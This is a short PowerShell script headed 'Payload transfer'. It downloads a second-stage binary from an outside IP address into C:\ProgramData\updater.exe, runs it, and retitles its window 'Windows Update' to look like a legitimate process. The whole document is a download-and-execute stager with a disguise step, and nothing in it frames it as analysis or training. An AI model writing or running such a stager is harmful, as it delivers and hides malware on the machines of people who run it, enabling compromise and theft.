
# Payload transfer
$PayloadUrl = "http://198.51.100.180/stage2.bin"
$WorkingPath = "C:\ProgramData\updater.exe"
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $WorkingPath)
& $WorkingPath
$Host.UI.RawUI.WindowTitle = "Windows Update"
Set-Location -Path $env:TEMP
